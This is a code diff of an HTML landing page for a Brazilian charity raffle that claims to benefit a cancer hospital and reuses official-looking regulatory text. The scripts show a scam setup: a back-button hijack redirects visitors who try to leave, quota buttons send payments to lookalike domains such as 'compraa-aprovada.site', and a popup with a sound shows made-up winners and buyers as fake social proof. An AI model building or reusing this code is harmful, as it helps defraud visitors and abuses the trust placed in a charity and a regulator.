@@ -16,7 +16,7 @@
 
 <script>
 // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
-const link = 'https://pay.compra-aprovadaa.site/ZPpXWErb';
+const link = 'https://canaldepremios.vercel.app/';
 function setBackRedirect(url) {
   let urlBackRedirect = url;
   urlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') + document.location.search.replace('?', '').toString();
@@ -126,7 +126,7 @@ setBackRedirect(link);
             <h2>Instituição beneficiada</h2>
           </div>
           <div class="card-hospital-text">
-            <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai...</p>
+            <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai, foi originalmente chamado Centro Norte Paranaense de Pesquisas Médicas. Criado com o objetivo de melhorar o tratamento do câncer e a qualidade de vida, o hospital focava inicialmente na prevenção do câncer de colo de útero entre as mulheres de Londrina e região. A instituição sempre buscou aprimorar seus recursos humanos, científicos e tecnológicos.</p>
           </div>
         </div>
 
@@ -136,7 +136,7 @@ setBackRedirect(link);
             <h2>Viva Privilégios</h2>
           </div>
           <div class="card-hospital-text">
-            <p>Viva Privilégios, um programa que enriquece sua vida com acesso saúde, alimentação, transporte e mais...</p>
+            <p>Viva Privilégios, um programa que enriquece sua vida com acesso saúde, alimentação, transporte e mais. Com cada compra, acumule pontos para trocar por consultas médicas, receber cashback, e utilizar serviços de telefonia e apps de transporte e alimentação. Eleve sua qualidade de vida e desfrute de mais conveniência e economia!</p>
           </div>
         </div>
       </div>
@@ -144,19 +144,7 @@ setBackRedirect(link);
   </div>
 </div>
 
-<link href="css/rodape.css" rel="stylesheet">
-<div class="rodape">
-  <div class="container-principal">
-    <img class="logo-rodape" src="images/logoviva.png">
-    <div class="redes">
-      <i class="bi bi-instagram"></i>
-      <i class="bi bi-facebook"></i>
-      <i class="bi bi-twitter"></i>
-      <i class="bi bi-youtube"></i>
-    </div>
-    <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>
-
-    <!-- 🔹 NOVA SEÇÃO DE GANHADORES -->
+  <!-- 🔹 NOVA SEÇÃO DE GANHADORES -->
 <section class="winners-section">
   <h2>Ganhadores do último sorteio</h2>
   <p>Confira os ganhadores do sorteio da edição <b>009 de domingo, 02 de novembro de 2025</b></p>
@@ -323,7 +311,133 @@ setBackRedirect(link);
   startAutoScroll();
 </script>
 
-<!-- RESTANTE DOS SCRIPTS -->
+
+<link href="css/rodape.css" rel="stylesheet">
+<div class="rodape">
+  <div class="container-principal">
+    <img class="logo-rodape" src="images/logoviva.png">
+    <div class="redes">
+      <i class="bi bi-instagram"></i>
+      <i class="bi bi-facebook"></i>
+      <i class="bi bi-twitter"></i>
+      <i class="bi bi-youtube"></i>
+    </div>
+    <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>
+    <div class="linha-rodape"></div>
+    <div class="patterns-rodape">
+      <div class="pattern-rodape"><b>Títulos emitidos por:</b> <img src="images/viacap.png"></div>
+      <div class="pattern-rodape"><b>Promoção realizada por:</b> <img src="images/viva.png"></div>
+      <div class="pattern-rodape"><b>Desenvolvimento:</b> <img src="images/edjdigital.png"></div>
+    </div>
+  </div>
+</div>
+
+<!-- BOTÃO + E - -->
+<script>
+const precoPorUnidade = 0.99;
+
+function incrementar() {
+  var input = document.getElementById('numero');
+  var valorAtual = parseInt(input.value);
+  if (valorAtual < 200) {
+    if (valorAtual === 0) input.value = 20;
+    else if (valorAtual === 20) input.value = 30;
+    else if (valorAtual === 30) input.value = 40;
+    else if (valorAtual === 40) input.value = 70;
+    else if (valorAtual === 70) input.value = 100;
+    else if (valorAtual === 100) input.value = 200;
+  }
+  highlightButton();
+}
+
+function decrementar() {
+  var input = document.getElementById('numero');
+  var valorAtual = parseInt(input.value);
+  if (valorAtual > 20) {
+    if (valorAtual === 200) input.value = 100;
+    else if (valorAtual === 100) input.value = 70;
+    else if (valorAtual === 70) input.value = 40;
+    else if (valorAtual === 40) input.value = 30;
+    else if (valorAtual === 30) input.value = 20;
+  }
+  highlightButton();
+}
+
+function highlightButton() {
+  var input = document.getElementById('numero');
+  var valorAtual = parseInt(input.value);
+  var botoesCotas = document.querySelectorAll('.cota');
+  var botaoAdicionarCarrinho = document.getElementById('btn-adicionar-carrinho');
+  var valorTotal = document.getElementById('valor-total');
+  var link;
+
+  botoesCotas.forEach(function (botao) {
+    botao.classList.remove('cota-selected');
+    var valorBotao = parseInt(botao.querySelector('.cota-qtd').innerText.trim());
+    if (valorBotao === valorAtual) {
+      botao.classList.add('cota-selected');
+      switch (valorBotao) {
+        case 20: link = "https://pay.compraa-aprovada.site/nocWXRdd"; break;
+        case 30: link = "https://pay.compraa-aprovada.site/nyYEZNjk"; break;
+        case 40: link = "https://pay.compraa-aprovada.site/XcZrKopG"; break;
+        case 70: link = "https://pay.compraa-aprovada.site/ArLfskBe"; break;
+        case 100: link = "https://pay.compraa-aprovada.site/ipANLDJe"; break;
+        case 200: link = "https://pay.compraa-aprovada.site/LQAHmGsM"; break;
+      }
+      botaoAdicionarCarrinho.setAttribute('onclick', 'adicionarAoCarrinho("' + link + '")');
+    }
+  });
+  botaoAdicionarCarrinho.disabled = valorAtual === 0;
+}
+
+function selecionarValor(valor) {
+  document.getElementById('numero').value = valor;
+  highlightButton();
+}
+
+function adicionarAoCarrinho(link) {
+  // 🚀 LEVA TODAS AS UTMS AUTOMATICAMENTE
+  const params = window.location.search;
+  window.location.href = link + params;
+}
+
+document.getElementById('numero').addEventListener('input', function () {
+  this.value = this.value.replace(/[^0-9]/g, '');
+  highlightButton();
+});
+</script>
+
+<!-- POPUP DE NOTIFICAÇÕES -->
+<div class="popup" id="popup"></div>
+<audio id="notifySound" preload="auto">
+  <source src="media/beep-07.wav" type="audio/wav">
+</audio>
+
+<script>
+const mensagens = [
+  "João P. acabou de Ganhar 50mil!",
+  "Larissa F. acabou de Ganhar Um Iphone 16 Pro!",
+  "Diego S. acabou de comprar 70 cotas!",
+  "Juliana M. acabou de comprar 100 cotas!",
+  "Bruno T. acabou de comprar 200 cotas!"
+];
+const popup = document.getElementById('popup');
+const notifySound = document.getElementById('notifySound');
+let index = 0;
+function mostrarPopup() {
+  if (index >= mensagens.length) return;
+  popup.innerText = mensagens[index];
+  popup.style.display = 'block';
+  notifySound.play();
+  setTimeout(() => {
+    popup.style.display = 'none';
+    index++;
+    setTimeout(mostrarPopup, 5000);
+  }, 4000);
+}
+window.onload = () => setTimeout(mostrarPopup, 1000);
+</script>
+
 <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
 
 <script>
